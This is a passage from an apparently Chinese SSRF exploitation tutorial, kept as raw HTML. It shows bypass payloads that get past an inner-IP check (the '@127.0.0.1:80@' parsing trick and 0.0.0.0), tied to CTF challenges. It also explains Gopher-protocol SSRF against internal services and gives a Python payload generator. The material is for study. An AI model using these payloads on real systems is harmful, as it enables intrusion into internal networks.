class="code-snippet__meta">?&gt;</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">上述代码中可以看到 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">check_inner_ip</span></code>函数通过 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">url_parse</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">()</span></code>函数检测是否为内网IP，如果不是内网 IP ，则通过 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">curl</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">()</span></code> 请求 url 并返回结果，我们可以利用curl和parse_url解析的差异不同来绕过这里的限制，让 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">parse_url</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">()</span></code> 处理外部网站网址，最后 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">curl</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">()</span></code> 请求内网网址。paylaod如下：</p><pre style="padding-top: 8px;padding-bottom: 6px;background: rgb(45, 45, 45);border-radius: 0px;overflow-y: auto;color: rgb(80, 97, 109);text-align: start;font-size:10px;line-height:30px;;line-height: 12px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 1px !important;border-style: solid !important;border-color: rgb(226, 226, 226) !important;"><ol class="list-paddingleft-2" style="padding-top: 10px;padding-bottom: 10px;padding-left: 30px;list-style-position: initial;list-style-image: initial;color: transparent;overflow-y: auto;list-style-type: none !important;"><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">ssrf</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">url</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">http</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">://@</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">127.0</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">0.1</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">:</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">80@www</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">baidu</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">com</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">/</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">flag</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span></code></span></span></p></li></ol></pre><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.19339622641509435" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/27_AmNOI3JkuTarhMe9yBCYaOEGk6icuQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gpnf5nZ8kXeKQknicicRicUJSEDdRAmNOI3JkuTarhMe9yBCYaOEGk6icuQ/640?wx_fmt=png'" data-type="png" data-w="1060" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">不过这个方法在Curl较新的版本里被修掉了，所以我们还可以使用另一种方法，即 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">0.0</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">.</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">0.0</span></code>。<code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">0.0</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">.</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">0.0</span></code> 这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址，使用如下即可绕过：</p><pre style="padding-top: 8px;padding-bottom: 6px;background: rgb(45, 45, 45);border-radius: 0px;overflow-y: auto;color: rgb(80, 97, 109);text-align: start;font-size:10px;line-height:30px;;line-height: 12px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 1px !important;border-style: solid !important;border-color: rgb(226, 226, 226) !important;"><ol class="list-paddingleft-2" style="padding-top: 10px;padding-bottom: 10px;padding-left: 30px;list-style-position: initial;list-style-image: initial;color: transparent;overflow-y: auto;list-style-type: none !important;"><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">ssrf</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">url</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">http</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">://</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">0.0</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">0.0</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">/</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">flag</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span></code></span></span></p></li></ol></pre><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">但是这只适用于Linux系统上，Windows系统的不行。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">[2020 首届“祥云杯”网络安全大赛]doyouknowssrf 这道题利用的就是这个思路。</p><h2 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:24px;line-height:44px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">常见攻击方式（Gopher协议）</h2><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">Gopher协议在SSRF中的利用</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用TCP 70端口。但在WWW出现后，Gopher失去了昔日的辉煌。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">现在的Gopher协议已经很少有人再使用它了，但是该协议在SSRF中却可以发挥巨大的作用，可以说是SSRF中的万金油。由于Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><strong style="color: rgb(0, 0, 0);">（1）Gopher协议格式</strong></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="http"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">URL</span>: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#</span> 注意不要忘记后面那个下划线<span class="code-snippet__string">"_"</span>，下划线<span class="code-snippet__string">"_"</span>后面才开始接TCP数据流，如果不加这个<span class="code-snippet__string">"_"</span>，那么服务端收到的消息将不是完整的，该字符可随意写。</span></code></pre></section><ul style="padding-left: 30px;list-style-position: initial;list-style-image: initial;color: rgb(80, 97, 109);font-size:15px;line-height:35px;;text-align: start;white-space: normal;margin-top: 6px !important;list-style-type: square !important;" class="list-paddingleft-2"><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">gopher的默认端口是70</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">如果发起POST请求，回车换行需要使用&nbsp;<code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;line-height: 22px;font-size:14px;line-height:34px; !important;">%</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;line-height: 22px;font-size:14px;line-height:34px; !important;">0d</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;line-height: 22px;font-size:14px;line-height:34px; !important;">%</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;line-height: 22px;font-size:14px;line-height:34px; !important;">0a</span></code>来代替&nbsp;<code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;line-height: 22px;font-size:14px;line-height:34px; !important;">%</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;line-height: 22px;font-size:14px;line-height:34px; !important;">0a</span></code>，如果多个参数，参数之间的&amp;也需要进行URL编码</span></p></li></ul><blockquote style="margin-bottom: 1.2em;padding: 15px 15px 15px 1rem;color: rgb(129, 145, 152);border-left-width: 6px;border-left-color: rgb(96, 125, 139);font-size:14px;line-height:34px;;line-height: 22px;background: rgb(242, 247, 251);text-align: start;white-space: normal;"><p style="margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">那么如何利用Gopher发送HTTP的请求呢？例如GET请求。我们直接发送一个原始的HTTP包不就行了吗。在gopher协议中发送HTTP的数据，需要以下三步：</p><ol style="padding-left: 30px;list-style-position: initial;list-style-image: initial;" class="list-paddingleft-2"><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">抓取或构造HTTP数据包</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;"><span style="line-height: 22px;">URL编码、将回车换行符&nbsp;<code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;line-height: 22px;font-size:14px;line-height:34px; !important;">%</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;line-height: 22px;font-size:14px;line-height:34px; !important;">0a</span></code>替换为&nbsp;<code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;line-height: 22px;font-size:14px;line-height:34px; !important;">%</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;line-height: 22px;font-size:14px;line-height:34px; !important;">0d</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;line-height: 22px;font-size:14px;line-height:34px; !important;">%</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;line-height: 22px;font-size:14px;line-height:34px; !important;">0a</span></code></span></span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">发送符合gopher协议格式的请求</span></p></li></ol></blockquote><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><strong style="color: rgb(0, 0, 0);">（2）利用Gopher协议发送HTTP GET请求</strong></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">测试代码：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__comment">// echo.php</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">echo</span> <span class="code-snippet__string">"Hello "</span>.$_GET[<span class="code-snippet__string">"whoami"</span>].<span class="code-snippet__string">"\n"</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">?&gt;</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">接下来我们构造payload。一个典型的GET型的HTTP包类似如下：<span style="color: rgb(204, 204, 204);font-size:13px;line-height:33px;;white-space: inherit;font family: inherit;background-color: rgb(45, 45, 45);"></span></p><pre style="padding-top: 8px;padding-bottom: 6px;background: rgb(45, 45, 45);border-radius: 0px;overflow-y: auto;color: rgb(80, 97, 109);text-align: start;font-size:10px;line-height:30px;;line-height: 12px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 1px !important;border-style: solid !important;border-color: rgb(226, 226, 226) !important;"><ol class="list-paddingleft-2" style="padding-top: 10px;padding-bottom: 10px;padding-left: 30px;list-style-position: initial;list-style-image: initial;color: transparent;overflow-y: auto;list-style-type: none !important;"><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">GET </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">/</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">echo</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">whoami</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(102, 153, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">Bunny</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> HTTP</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">/</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">1.1</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(102, 153, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">Host</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">:</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">47.xxx</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">xxx</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">72</span></code></span></span></p></li></ol></pre><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">然后利用以下脚本进行一步生成符合Gopher协议格式的payload：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="python"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">import</span> urllib.parse</span></code><code><span class="code-snippet_outer">payload =\</span></code><code><span class="code-snippet_outer"><span class="code-snippet__string">"""GET /echo.php?whoami=Bunny HTTP/1.1</span></span></code><code><span class="code-snippet_outer">Host: 47.xxx.xxx.72</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">"""</span>  </span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span></span></code><code><span class="code-snippet_outer">tmp = urllib.parse.quote(payload)</span></code><code><span class="code-snippet_outer">new = tmp.replace(<span class="code-snippet__string">'%0A'</span>,<span class="code-snippet__string">'%0D%0A'</span>)</span></code><code><span class="code-snippet_outer">result = <span class="code-snippet__string">'gopher://47.xxx.xxx.72:80/'</span>+<span class="code-snippet__string">'_'</span>+new</span></code><code><span class="code-snippet_outer">print(result)</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.07755581668625147" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/28_KzyAIaJTkoh7QNibuRV5uib6rSQc0Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gu4NyNS1KtCflvvNSzWhbUpPJpQKzyAIaJTkoh7QNibuRV5uib6rSQc0Q/640?wx_fmt=png'" data-type="png" data-w="851" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><blockquote style="margin-bottom: 1.2em;padding: 15px 15px 15px 1rem;color: rgb(129, 145, 152);border-left-width: 6px;border-left-color: rgb(96, 125, 139);font-size:14px;line-height:34px;;line-height: 22px;background: rgb(242, 247, 251);text-align: start;white-space: normal;"><p style="margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);"><strong style="color: rgb(0, 0, 0);">注意这几个问题：</strong></p><ol style="padding-left: 30px;list-style-position: initial;list-style-image: initial;" class="list-paddingleft-2"><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">问号（?）需要转码为URL编码，也就是%3f</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;">在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</span></p></li></ol></blockquote><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">然后执行：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="apache"><code><span 